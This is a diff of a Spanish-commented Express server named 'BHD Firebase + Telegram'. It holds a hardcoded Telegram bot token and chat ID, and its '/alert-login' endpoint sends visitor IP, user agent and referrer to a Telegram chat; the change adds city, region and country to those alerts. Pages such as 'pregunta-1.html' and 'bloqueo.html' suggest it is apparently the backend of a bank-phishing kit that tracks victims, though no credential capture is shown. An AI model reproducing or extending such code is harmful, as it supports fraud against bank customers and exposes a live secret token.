@@ -24,8 +24,8 @@ app.use(express.json({ limit: '10mb' }));
 // === CONFIGURACIÓN DE TELEGRAM ===
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8302617462:AAGikIPtSly1eLtqJdEOQ8w2AoCGEj9gGKY';
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '-1002991672575';
-const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`; // ✅ Sin espacios
-const SERVER_URL = process.env.RENDER_URL || 'https://bhs-8syw.onrender.com'; // ✅ Sin espacios
+const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`; // ✅ SIN ESPACIOS
+const SERVER_URL = process.env.RENDER_URL || 'https://bhs-8syw.onrender.com'; // ✅ SIN ESPACIOS
 const ALLOWED_PAGES = [
   'index.html',
   'pregunta-1.html',
@@ -39,7 +39,7 @@ const ALLOWED_PAGES = [
   'bloqueo.html'
 ];
 
-// === ALERTA DE ACCESO A INDEX.HTML ===
+// === ALERTA DE ACCESO A INDEX.HTML CON CIUDAD, PAÍS Y ESTADO ===
 app.post('/alert-login', async (req, res) => {
   let data = req.body;
   // Parseo manual en caso de que el body llegue vacío
@@ -58,10 +58,11 @@ app.post('/alert-login', async (req, res) => {
     }
   }
 
-  const { ip, referrer, userAgent, timestamp } = data;
+  const { ip, referrer, userAgent, timestamp, city, country, region } = data;
   
-  const message = `🚨 *ACCESO A  BHD*\n` +
+  const message = `🚨 *ACCESO A BHD*\n` +
                   `🔹 *IP*: \`${ip || 'N/A'}\`\n` +
+                  `🔹 *Ubicación*: ${city || 'N/A'}, ${region || 'N/A'}, ${country || 'N/A'}\n` +
                   `🔹 *Referrer*: ${referrer || 'Directo'}\n` +
                   `🔹 *UserAgent*: ${userAgent?.substring(0, 80) || 'N/A'}...\n` +
                   `🔹 *Fecha*: ${new Date(timestamp).toLocaleString()}\n` +
@@ -104,7 +105,7 @@ try {
 try {
   admin.initializeApp({
     credential: admin.credential.cert(serviceAccount),
-    databaseURL: 'https://bhd-firebase-default-rtdb.firebaseio.com' // ✅ Sin espacios
+    databaseURL: 'https://bhd-firebase-default-rtdb.firebaseio.com' // ✅ SIN ESPACIOS
   });
   console.log('✅ Firebase Admin SDK inicializado correctamente');
 } catch (error) {
@@ -622,7 +623,7 @@ app.get('/', (req, res) => {
     </head>
     <body>
         <h1>🚀 Servidor BHD Firebase + Telegram</h1>
-        <div class="status success">✅ Servidor activo - SISTEMA DE ERRORES ESPECÍFICOS</div>
+        <div class="status success">✅ Servidor activo - MENSAJES PRESERVADOS</div>
         
         <div class="endpoints">
             <strong>🔧 Endpoints:</strong><br>
